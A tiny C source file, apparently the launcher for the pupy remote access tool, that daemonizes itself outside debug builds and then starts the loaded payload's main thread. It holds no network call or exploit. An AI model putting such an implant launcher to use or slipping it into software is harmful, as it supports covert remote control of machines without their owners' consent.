#include "pupy_load.h"
#include "daemonize.h"

int main(int argc, char *argv[], char *env[]) {
#ifndef DEBUG
    daemonize(argc, argv, env, true);
#endif
    return mainThread(argc, argv, false);
}
